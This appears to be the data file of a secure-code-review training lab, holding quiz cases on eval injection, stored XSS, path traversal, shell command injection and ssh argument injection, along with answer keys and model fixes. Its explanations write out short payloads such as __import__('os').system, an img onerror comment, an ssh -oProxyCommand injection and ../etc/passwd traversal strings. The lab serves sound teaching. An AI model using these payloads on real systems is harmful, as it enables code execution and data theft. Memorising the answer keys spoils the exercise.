                  { out: 'Stripped to invoices-archive/acme-2025.pdf inside BASE: 404', pass: true },
                  { out: 'Link followed: /etc/hostname returned', pass: false },
                  { out: 'URIError thrown: 500 with stack trace', pass: false },
                ],
              },
              {
                label: 'String prefix check: full.startsWith(BASE)',
                code: "const full = path.resolve(BASE, decodeURIComponent(req.query.file));\nif (!full.startsWith(BASE)) return res.sendStatus(403);",
                results: [
                  { out: 'PDF returned', pass: true },
                  { out: 'Resolves inside BASE as ..../..../etc/passwd: 404', pass: true },
                  { out: '403', pass: true },
                  { out: '/srv/app/.env: 403', pass: true },
                  { out: '/srv/invoices-archive/... starts with /srv/invoices: other customer file returned', pass: false },
                  { out: 'String check passes; link followed: /etc/hostname returned', pass: false },
                  { out: 'URIError thrown: 500 with stack trace', pass: false },
                ],
              },
              {
                label: 'Decode once, reject malformed, realpath, component containment',
                code: [
                  'const raw = req.query.file;   // decoded once by the framework; never decode again',
                  "if (typeof raw !== 'string' || /[%\\0]/.test(raw) || path.isAbsolute(raw)) return res.sendStatus(400);",
                  'let real;',
                  'try { real = await fs.realpath(path.join(BASE_REAL, raw)); } catch { return res.sendStatus(404); }',
                  'const rel = path.relative(BASE_REAL, real);',
                  "if (!rel || rel === '..' || rel.startsWith('..' + path.sep) || path.isAbsolute(rel)) return res.sendStatus(404);",
                  "res.type('pdf').send(await fs.readFile(real));   // TOCTOU: link could change before this read",
                ].join('\n'),
                results: [
                  { out: 'PDF returned', pass: true },
                  { out: 'Resolves inside BASE as ..../..../etc/passwd: 404', pass: true },
                  { out: '400 absolute path', pass: true },
                  { out: '400: still contains % after the single decode', pass: true },
                  { out: 'rel is ../invoices-archive/...: 404', pass: true },
                  { out: 'realpath is /etc/hostname, rel starts with ..: 404', pass: true },
                  { out: '400: contains %', pass: true },
                ],
              },
              {
                label: 'Server-managed invoice IDs owned by the user',
                code: [
                  "const row = await db.invoices.findOne({ id: String(req.query.id), customerId: req.user.customerId });",
                  'if (!row) return res.sendStatus(404);',
                  "res.type('pdf').send(await fs.readFile(path.join(BASE, row.storedName)));   // storedName set by server",
                ].join('\n'),
                results: [
                  { out: 'id for INV-1042 → PDF returned', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                  { out: 'Not an invoice id: 404', pass: true },
                ],
              },
            ],
          },
        },
      ],
    },
  ];

  // Queue cases: title, alert, scenario, code and options must not name the weakness class. cwe is shown after submission.
  const queue = [
    {
      id: 'q-columns',
      title: 'Case 1 · reporting service',
      scenario: 'Analysts add computed columns to saved reports.',
      alert: { rule: 'taint/request-to-sensitive-call', severity: 'High', location: 'reports/columns.py:6', message: 'Request-derived value reaches a sensitive call.' },
      lang: 'Python (Flask)',
      code: [
        '# reports/columns.py',
        '@app.post("/reports/<rid>/columns")',
        'def add_column(rid):',
        '    expr = request.json["formula"]        # e.g. "row[\'qty\'] * row[\'price\']"',
        '    rows = load_rows(rid)',
        '    for row in rows:',
        '        row["computed"] = eval(expr, {}, {"row": row})',
        '    return jsonify(rows)',
      ].join('\n'),
      source: { options: ['request.json["formula"] — request body', 'load_rows(rid) — rows from the report store', 'The empty {} globals argument to eval()', 'jsonify(rows) output'], answer: 0 },
      sink: { options: ['jsonify(rows) response', 'eval(expr, ...)', 'load_rows(rid) data load', 'row["computed"] assignment'], answer: 1 },
      control: { options: ['Missing CSRF token', 'Control present: the empty {} globals sandbox the expression', 'No formula parser; {} globals still get builtins', 'Missing pagination'], answer: 2 },
      cls: 'confirmed',
      cwe: 'CWE-95 (Eval Injection), a child of CWE-94',
      worked: [
        'Evidence: request.json["formula"] goes straight to eval, and empty {} globals still get __builtins__, so __import__("os").system(...) runs.',
        'Use a small arithmetic parser over known columns instead.',
      ],
      model: {
        impact: 'Code execution on the reporting service with its database credentials.',
        ticket: 'Replace eval with a parser for numbers, report fields and + - * / ( ).',
        verification: "row['qty'] * row['price'] still computes; __import__ and attribute access get 400.",
      },
    },
    {
      id: 'q-comments',
      title: 'Case 2 · discussion widget',
      scenario: 'Other users\' comments are loaded and listed under an article.',
      alert: { rule: 'taint/api-to-dom', severity: 'Medium', location: 'public/comments.js:4', message: 'API response field written to the page.' },
      lang: 'JavaScript (browser)',
      code: [
        '// public/comments.js',
        "for (const c of await api.get('/threads/' + threadId + '/comments')) {",
        "  const li = document.createElement('li');",
        "  li.innerHTML = '<b>' + c.author + '</b> ' + c.body;",
        '  list.append(li);',
        '}',
      ].join('\n'),
      source: { options: ['threadId — selects which thread to load', "document.createElement('li') call", 'c.author / c.body from the API', 'list element'], answer: 2 },
      sink: { options: ['li.innerHTML assignment', 'list.append(li)', 'api.get(...) fetch', "createElement('li')"], answer: 0 },
      control: { options: ['Missing server rate limit on comments', 'Control present: comments come from our own API', 'Missing pagination', 'textContent / text nodes not used'], answer: 3 },
      cls: 'confirmed',
      cwe: 'CWE-79 (stored, rendered by DOM code)',
      worked: [
        'Evidence: li.innerHTML parses c.author and c.body, which other users stored, so an img onerror comment runs for every reader. Our own API still returns their text.',
        'Build nodes with textContent; use a sanitizer only if comments are meant to be rich HTML.',
      ],
      model: {
        impact: 'Script runs for every reader: account actions and data theft at scale.',
        ticket: 'Build comment nodes with createElement/textContent; ban innerHTML for API data.',
        verification: 'A comment "<img src=x onerror=alert(1)>" shows as text; & and < display exactly.',
      },
    },
    {
      id: 'q-avatar',
      title: 'Case 3 · account service',
      scenario: 'Users fetch their own avatar image.',
      alert: { rule: 'taint/user-to-file-path', severity: 'High', location: 'avatars.js:4', message: 'User property used to build a file path.' },
      lang: 'JavaScript (Node/Express)',
      code: [
        '// avatars.js',
        "const AVATARS = '/srv/avatars';",
        "app.get('/me/avatar', requireLogin, (req, res) => {",
        "  res.sendFile(path.join(AVATARS, req.user.avatarId + '.webp'));",
        '});',
        '',
        '// upload.js (only writer of avatarId):',
        '//   user.avatarId = crypto.randomUUID();   // column NOT NULL, CHECK uuid format',
        '// No route lets a user set avatarId directly.',
      ].join('\n'),
      source: { options: ['req.query.file', 'req.user.avatarId — user record field', 'Request URL path', 'Upload filename'], answer: 1 },
      sink: { options: ['crypto.randomUUID() in upload.js', 'requireLogin middleware', "The '.webp' file extension suffix", 'res.sendFile(path.join(...))'], answer: 3 },
      control: { options: ['No ../ filtering or normalisation on avatarId', 'No prefix check on the joined path', 'Control present: randomUUID() + uuid CHECK', 'Missing decodeURIComponent'], answer: 2 },
      cls: 'false-positive',
      cwe: 'Rule maps to CWE-22; not exploitable here (false positive)',
      worked: [
        'Evidence: only upload.js writes avatarId (randomUUID), a CHECK enforces uuid format, and no route accepts it from the client.',
        'The scanner wrongly treated req.user as tainted. Close as false positive citing that evidence.',
      ],
      model: {
        impact: 'None: the user cannot influence the path segment.',
        ticket: 'Close with a scanner suppression citing upload.js; add a test that PATCH /me ignores avatarId.',
        verification: 'avatarId is unchanged after PATCH avatarId="../../etc/passwd"; the CHECK rejects non-UUIDs.',
      },
    },
    {
      id: 'q-thumbs',
      title: 'Case 4 · media worker',
      scenario: 'A worker makes thumbnails for jobs queued by another service.',
      alert: { rule: 'taint/format-to-process', severity: 'High', location: 'jobs/thumbs.py:4', message: 'Formatted string passed to a process call.' },
      lang: 'Python',
      code: [
        '# jobs/thumbs.py',
        'def make_thumb(job):',
        '    cmd = settings.THUMB_CMD.format(src=job.src_path, dst=job.dst_path)',
        '    subprocess.run(cmd, shell=True, check=True)',
        '',
        '# settings.THUMB_CMD = "convert {src} -resize 256x256 {dst}"',
        '# job.src_path / dst_path are set by media-ingest (separate repo, not in this review).',
      ].join('\n'),
      source: { options: ['settings.THUMB_CMD — deploy-time config', 'check=True — raise on non-zero exit', 'The worker queue name', 'job.src_path / job.dst_path'], answer: 3 },
      sink: { options: ['settings.THUMB_CMD.format(src=..., dst=...)', 'settings import', 'subprocess.run(cmd, shell=True)', 'make_thumb return'], answer: 2 },
      control: { options: ['Control present: paths are always server-generated', 'shell=True string; no argv list or path checks', 'Missing HTML encoding', 'Missing rate limit'], answer: 1 },
      cls: 'needs-evidence',
      cwe: 'Would be CWE-78 if users influence the paths; evidence missing',
      worked: [
        'Evidence: shell=True makes the call dangerous, but src_path is set in media-ingest, which this review cannot see. Either verdict would be a guess.',
        'Ask for the ingest code and sample jobs; meanwhile, pass an argument list without shell=True.',
      ],
      model: {
        impact: 'If upload filenames reach src_path: command execution on the media worker. If not: none.',
        ticket: 'Ask media-ingest how src_path is built. Hardening: build src/dst from server names (uuid + .png, never starting with "-") under a fixed media directory and pass an argument list to subprocess.run without shell=True.',
        verification: 'Evidence shows where src_path comes from; src_path "a.png;id" is rejected or treated as a literal name.',
      },
    },
    {
      id: 'q-uptime',
      title: 'Case 5 · on-call console',
      scenario: 'On-call engineers type a fleet host to check its uptime. No shell is used.',
      alert: { rule: 'taint/request-to-process-arg', severity: 'Medium', location: 'fleet.js:5', message: 'Request value passed as process argument.' },
      lang: 'JavaScript (Node/Express)',
      code: [
        '// fleet.js',
        "const { execFile } = require('node:child_process');",
        "app.post('/fleet/uptime', requireLogin, (req, res) => {",
        '  const host = String(req.body.host);            // e.g. "web-03.internal"',
        "  execFile('/usr/bin/ssh', ['-o', 'BatchMode=yes', host, 'uptime'],",
        "    (err, out) => res.type('text').send(err ? 'unreachable' : out));",
        '});',
      ].join('\n'),
      source: { options: ['req.body.host', "'BatchMode=yes' literal", "'uptime' literal", 'out — process output'], answer: 0 },
      sink: { options: ['A shell parses host before ssh runs', 'host as an ssh argv element', "res.type('text').send(out)", 'requireLogin — console login check'], answer: 1 },
      control: { options: ['No shell escaping of host', 'Missing output encoding', 'Control present: execFile avoids the shell', 'host not checked against the fleet inventory'], answer: 3 },
      cls: 'confirmed',
      cwe: 'CWE-88 (Argument Injection), related to CWE-78',
      worked: [
        'Evidence: execFile avoids the shell, but req.body.host goes unchecked into ssh\'s argv, so -oProxyCommand=sh -c "id>/tmp/p" makes ssh run a local command.',
        'Accept only fleet inventory hostnames and keep options fixed in code.',
      ],
      model: {
        impact: 'Command execution on the console host via ssh ProxyCommand; access to its SSH keys.',
        ticket: 'Look host up in the fleet inventory and pass the inventory value; 400 for unknown hosts.',
        verification: 'web-03.internal works; -oProxyCommand=... and any value starting with "-" get 400.',
      },
    },
  ];

  const LAB = { modules, queue };
  if (typeof module !== 'undefined' && module.exports) module.exports = LAB;
  else window.LAB = LAB;
})();
